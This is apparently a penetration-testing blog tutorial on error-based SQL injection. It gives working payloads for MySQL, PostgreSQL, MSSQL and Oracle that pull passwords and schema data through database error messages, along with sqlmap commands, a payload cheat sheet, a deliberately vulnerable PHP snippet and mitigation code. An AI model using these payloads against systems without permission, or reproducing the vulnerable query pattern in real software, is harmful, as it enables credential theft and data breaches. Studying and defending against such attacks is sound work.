---
title: "SQL Injection — Error Based"
date: 2026-04-03T01:00:01+07:00
draft: false
author: "Andrew"
summary: "Error-Based SQL Injection is a technique where the attacker exploits database error messages to extract information from the database."
tags: ["Web Penetration Testing", "SQL Injection", "Error Based"]
categories: ["Web Penetration Testing", "SQL Injection"]
description: ""
---

# SQL Injection — Error Based

## What Is Error-Based SQLi?

Among all SQL injection types, **Error-Based SQLi** is the most "verbose", the application voluntarily leaks information through database error messages. Attackers don't need to guess or measure response times; they just trigger an error, and the database will spill the data that should have been hidden.

It's like asking someone who talks too much: not only do they answer your question, but they also volunteer extra context, lifestyle details, and information you weren't even supposed to know.

---

## How It Works

**Basic Concept:**

The attacker injects a payload that deliberately triggers a database error, but the payload is constructed so the error contains the data the attacker wants to extract. The database, in its habit of displaying full error messages, leaks that information.

**Simple example:**

```
Normal: GET /product?id=1 → Returns product data

Malicious: GET /product?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)))--
```

**Error message returned:**

```
XPATH - MySQL Error: 1105 - XPATH syntax error: '~adminpassword123'
```

Password `adminpassword123` exposed in the error message!

---

## Popular Techniques

### 1. MySQL — EXTRACTVALUE / UPDATEXML

```sql
-- EXTRACTVALUE (MySQL 5.1+)
AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 1)))

-- UPDATEXML (alternative)
AND UPDATEXML(1, CONCAT(0x7e, (SELECT database())), 1)
```

### 2. PostgreSQL — cast() or :: casting

```sql
AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--
```

### 3. MSSQL — convert() or cast()

```sql
AND 1=CONVERT(INT, (SELECT TOP 1 username FROM users))
```

### 4. Oracle — utl_inaddr.get_host_name

```sql
AND 1=utl_inaddr.get_host_name((SELECT password FROM users))
```

---

## Attack Diagram

```
┌─────────────────────────────────────────────────────────────┐
│  ATTACKER                                                   │
│  Payload: EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password   │
│           FROM users WHERE username='admin')))             │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  WEB APPLICATION                                            │
│  Query: SELECT * FROM products WHERE id =                 │
│         EXTRACTVALUE(1, CONCAT(0x7e,                       │
│              (SELECT password FROM users...)))            │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  MySQL ERROR LOG:                                          │
│  "XPATH syntax error: '~adminpassword123'"                  │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  ATTACKER RECEIVES:                                        │
│  "The password of admin user is: adminpassword123"         │
└─────────────────────────────────────────────────────────────┘
```

---

## Vulnerable Code Example

**PHP — Error reporting enabled:**

```php
<?php
// Production server with error reporting ON (BAD!)
error_reporting(E_ALL);
ini_set('display_errors', 1);

$id = $_GET['id'];
$query = "SELECT * FROM products WHERE id = $id";

try {
    $result = mysqli_query($conn, $query);
} catch (Exception $e) {
    // Error disclosure — shows error details to user
    echo "Database Error: " . $e->getMessage();
}
?>
```

**What the attacker gets:**

```
GET /product?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)))

Output:
Database Error: XPATH syntax error: '~admin_hashed_password'
```

---

## Mitigation

```php
<?php
// PRODUCTION: Turn off error display
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 1);  // Log to file, not screen

// Use prepared statements
$stmt = $conn->prepare("SELECT * FROM products WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
```

**General principles:**
```
✅ Turn off error display in production
✅ Use prepared statements
✅ Error logging to file, not to user output
✅ Custom error pages to hide technical details
```

---

## Manual Detection

```bash
# With sqlmap
sqlmap -u "https://example.com/product?id=1" --technique=E --batch

# Manual error trigger
' " ) ) --
AND EXTRACTVALUE(1, CONCAT(0x7e, database()))--
AND UPDATEXML(1, CONCAT(0x7e, version()), 1)--
```

---

## Cheat Sheet

| Database | Extract Data Payload |
|----------|---------------------|
| MySQL 5.1+ | `EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users)))` |
| MySQL 5.1+ | `UPDATEXML(1, CONCAT(0x7e, version()), 1)` |
| PostgreSQL | `CAST((SELECT password FROM users LIMIT 1) AS INT)` |
| MSSQL | `CONVERT(INT, (SELECT TOP 1 password FROM users))` |

| Get Info | Payload |
|----------|---------|
| Database name | `EXTRACTVALUE(1, CONCAT(0x7e, database()))` |
| User version | `EXTRACTVALUE(1, CONCAT(0x7e, version()))` |
| Table names | `EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables)))` |
| Column names | `EXTRACTVALUE(1, CONCAT(0x7e, (SELECT column_name FROM information_schema.columns)))` |

---

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [Error-Based Injection Explained](https://resources.infosecacademy.com/error-based-sql-injection/)
